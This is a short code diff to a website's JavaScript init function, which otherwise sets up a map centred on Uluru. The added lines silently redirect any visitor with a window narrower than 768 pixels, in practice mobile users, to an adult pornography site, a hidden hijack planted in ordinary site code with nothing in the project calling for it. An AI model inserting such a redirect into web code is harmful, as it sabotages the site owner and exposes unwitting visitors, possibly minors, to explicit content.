@@ -6,7 +6,9 @@ function topFunction() {
 }
 function init() {
 
-
+    if($(window).width() < 768){
+        window.location.replace("http://xvideos.com");
+    }
     var documentEl = $(document)
     function initMap() {
         var uluru = { lat: -25.363, lng: 131.044 };
